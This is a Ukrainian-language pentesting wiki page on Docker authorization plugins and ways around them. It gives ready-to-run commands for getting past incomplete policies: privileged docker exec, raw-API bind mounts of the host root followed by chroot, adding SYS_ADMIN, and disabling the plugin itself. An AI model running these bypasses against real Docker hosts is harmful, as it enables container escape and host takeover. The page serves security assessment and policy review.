# Плагіни авторизації Runtime

{{#include ../../../banners/hacktricks-training.md}}

## Огляд

Плагіни авторизації Runtime — це додатковий рівень політик, який визначає, чи може caller виконати певну дію daemon. Docker є класичним прикладом. За замовчуванням будь-хто, хто може взаємодіяти з Docker daemon, фактично отримує широкий контроль над ним. Плагіни авторизації намагаються звузити цю модель, перевіряючи автентифікованого користувача та запитану API-операцію, а потім дозволяючи або відхиляючи запит відповідно до політики.

Ця тема заслуговує на окрему сторінку, оскільки вона змінює модель exploitation, коли attacker уже має доступ до Docker API або до користувача в групі `docker`. У таких середовищах питання полягає вже не лише в тому, «чи можу я досягти daemon?», а й у тому, «чи обмежений daemon authorization layer, і якщо так, чи можна обійти цей layer через необроблені endpoints, слабкий JSON parsing або permissions для керування plugins?»

## Робота

Коли запит надходить до Docker daemon, authorization subsystem може передати контекст запиту одному або кільком встановленим plugins. Plugin бачить identity автентифікованого користувача, деталі запиту, вибрані headers, а також частини body запиту або response, якщо тип вмісту є відповідним. Кілька plugins можна об'єднати в chain, і доступ надається лише тоді, коли всі plugins дозволяють запит.

Ця модель звучить надійно, але її безпека повністю залежить від того, наскільки повно автор політики зрозумів API. Plugin, який блокує `docker run --privileged`, але ігнорує `docker exec`, пропускає альтернативні JSON keys, такі як top-level `Binds`, або дозволяє plugin administration, може створити хибне відчуття обмеження, водночас залишаючи відкритими прямі шляхи до privilege escalation.

## Поширені цілі для Plugins

Важливі області для policy review:

- endpoints створення контейнерів
- поля `HostConfig`, такі як `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` та options для спільного використання namespaces
- поведінка `docker exec`
- endpoints керування plugins
- будь-який endpoint, який може опосередковано запускати runtime actions поза межами передбаченої policy model

Історично такі приклади, як `authz` plugin від Twistlock і прості educational plugins, такі як `authobot`, спрощували вивчення цієї моделі, оскільки їхні policy files і code paths демонстрували, як фактично реалізовувалося зіставлення endpoint-to-action. Для assessment work важливий висновок полягає в тому, що автор policy має розуміти весь API surface, а не лише найпомітніші CLI commands.

## Зловживання

Перша мета — з'ясувати, що саме блокується. Якщо daemon відхиляє action, помилка часто leak-ить назву plugin, що допомагає визначити використовуваний control:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Якщо вам потрібно ширше профілювання endpoint, корисними будуть такі інструменти, як `docker_auth_profiler`, оскільки вони автоматизують інакше повторюване завдання перевірки того, які маршрути API та структури JSON насправді дозволені плагіном.

Якщо середовище використовує кастомний плагін і ви можете взаємодіяти з API, перелікуйте, які поля об’єктів насправді фільтруються:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ці перевірки важливі, оскільки багато помилок авторизації стосуються конкретних полів, а не концепцій загалом. Plugin може відхилити шаблон CLI, не блокуючи повністю еквівалентну структуру API.

### Повний приклад: `docker exec` додає привілеї після створення контейнера

Політику, яка блокує створення привілейованих контейнерів, але дозволяє створення unconfined-контейнерів разом із `docker exec`, усе ще можна обійти:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Якщо daemon приймає другий крок, користувач отримує привілейований інтерактивний процес усередині container, який, на думку автора політики, мав бути обмеженим.

### Повний приклад: Bind Mount через Raw API

Деякі несправні політики перевіряють лише одну JSON-форму. Якщо bind mount root filesystem не блокується послідовно, host усе ще можна змонтувати:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Та сама ідея також може бути представлена в `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Вплив полягає в повному виході до файлової системи хоста. Цікава деталь полягає в тому, що bypass виникає через неповне охоплення policy, а не через помилку ядра.

### Повний приклад: неперевірений атрибут capability

Якщо policy забуває фільтрувати атрибут, пов’язаний із capability, attacker може створити container, який повторно отримує небезпечну capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Коли присутня `CAP_SYS_ADMIN` або подібна потужна capability, стають доступними багато технік breakout, описаних у [capabilities.md](protections/capabilities.md) і [privileged-containers.md](privileged-containers.md).

### Повний приклад: вимкнення Plugin

Якщо дозволені операції керування plugin, найчистішим bypass може бути повне вимкнення цього контролю:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Це помилка політики на рівні control plane. Рівень авторизації існує, але користувач, якого він мав обмежувати, усе ще має дозвіл на його вимкнення.

## Перевірки

Ці команди призначені для визначення того, чи існує рівень політики та чи здається він повним, а не поверхневим.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Що тут цікавого:

- Повідомлення про відмову, які містять назву плагіна, підтверджують наявність authorization layer і часто розкривають точну реалізацію.
- Список плагінів, видимий attacker, може бути достатнім для визначення можливості операцій disable або reconfigure.
- Політику, яка блокує лише очевидні CLI-дії, але не raw API requests, слід вважати bypassable, доки не буде доведено протилежне.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Доступ до daemon фактично є all-or-nothing, якщо не налаштовано authorization plugin | неповна plugin policy, blacklists замість allowlists, дозвіл на plugin management, blind spots на рівні полів |
| Podman | Not a common direct equivalent | Podman зазвичай більше покладається на Unix permissions, rootless execution і рішення щодо API exposure, ніж на authz plugins у стилі Docker | широке відкриття rootful Podman API, слабкі socket permissions |
| containerd / CRI-O | Different control model | Ці runtimes зазвичай покладаються на socket permissions, node trust boundaries і controls оркестратора на вищому рівні, а не на Docker authz plugins | монтування socket у workloads, слабкі node-local trust assumptions |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC і admission controls є основним policy layer | надмірно широкі RBAC, слабка admission policy, пряме відкриття kubelet або runtime APIs |

{{#include ../../../banners/hacktricks-training.md}}
